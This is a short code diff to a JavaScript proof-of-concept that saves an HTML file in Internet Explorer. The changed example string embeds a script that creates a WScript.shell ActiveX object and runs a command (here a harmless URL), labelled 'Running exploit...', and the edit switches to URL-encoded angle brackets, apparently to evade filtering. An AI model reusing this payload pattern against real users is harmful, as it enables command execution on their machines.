@@ -16,7 +16,7 @@ function downloadFileIE(data, fileName, mimeType) {
 }
 
 // Example usage
-const fileData = "\<script>var objShell = new ActiveXObject('WScript.shell');objShell.run('https://google.com');\</script><h1>Running exploit...</h1>";
+const fileData = "%3Cscript>var objShell = new ActiveXObject('WScript.shell');objShell.run('https://google.com');%3C/script><h1>Running exploit...</h1>";
 const fileName = 'ssfntest.html';
 const mimeType = 'text/html';
 
